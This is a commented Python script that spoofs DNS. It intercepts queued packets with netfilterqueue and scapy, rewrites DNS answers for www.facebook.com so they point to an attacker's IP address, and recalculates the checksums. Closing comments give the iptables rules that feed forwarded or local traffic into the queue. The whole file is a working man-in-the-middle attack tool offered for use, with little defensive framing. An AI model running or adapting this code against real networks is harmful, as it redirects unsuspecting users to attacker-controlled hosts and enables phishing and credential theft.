import netfilterqueue                                   #FOR IMPORTING IPTABLE QUEUES
import scapy.all as scapy

def process_packet(packet):
    scapy_pkt = scapy.IP(packet.get_payload())          #TO GET THE ENTIRE IP PAYLOAD
    if scapy_pkt.haslayer(scapy.DNSRR):                 #CHECK WHETHER THERE IS A DNS "REQUEST RESPONSE" IN THE PAYLOAD
        qname = scapy_pkt[scapy.DNSQR].qname            #TO GET THE DNS "QUESTION NAME" VARIABLE qname FROM THE PAYLOAD
        if "www.facebook.com" in qname:                 #SET THE ADDRESS WHOSE DNS REQUEST IS TO BE SPOOFED
            print "[+] Spoofing the target"
            answer = scapy.DNSRR(rrname = qname, rdata = "192.168.0.107")       #CHANGE THE VALUE OF VARIABLES rrname TO THE VALUE FOR WHICH THE DNS QUERY IS MADE AND rdata TO OUR ATTACKING MACHINE'S IP
            scapy_pkt[scapy.DNS].an = answer            #CHANGE THE ANSWER PART OF DNS IN THE PAYLOAD TO OUR SPOOFED PART
            scapy_pkt[scapy.DNS].ancount = 1            #CHANGE THE ANSWER COUNT TO 1 INSTEAD OF MULTIPLE ANSWERS THAT ARE RETURNED

            #DELETE THE ACTUAL IP AND UDP len AND chksum VALUE FROM THE PAYLOAD AND SCAPY WILL AUTOMATICALLY RECALCULATE THOSE VALUES AND FOWARD THE PAYLOAD
            del scapy_pkt[scapy.IP].len
            del scapy_pkt[scapy.IP].chksum
            del scapy_pkt[scapy.UDP].len
            del scapy_pkt[scapy.UDP].chksum

            packet.set_payload(str(scapy_pkt))          #THIS CHANGES THE REAL PAYLOAD TO THE SPOOFED PAYLOAD

    packet.accept()                                     #FORWARD THE PACKET

queue = netfilterqueue.NetfilterQueue()                 #CREATING AN OBJECT OF NETFILTERQUEUE
queue.bind(0, process_packet)                           #BINDING THE QUEUE NUMBER TO THE OBJECT AND SPECIFYING THE FUNCTION TO PERFORM THAT IS TO BE TRIGGERED
queue.run()                                             #START PROCESSING THE QUEUE



#configure "#iptables -I FORWARD -j netfilter --queue-num 0" for remote machine
#For local machine
##iptables -I OUTPUT -j NFQUEUE --queue-num 0
##iptables -I INPUT -j NFQUEUE --queue-num 0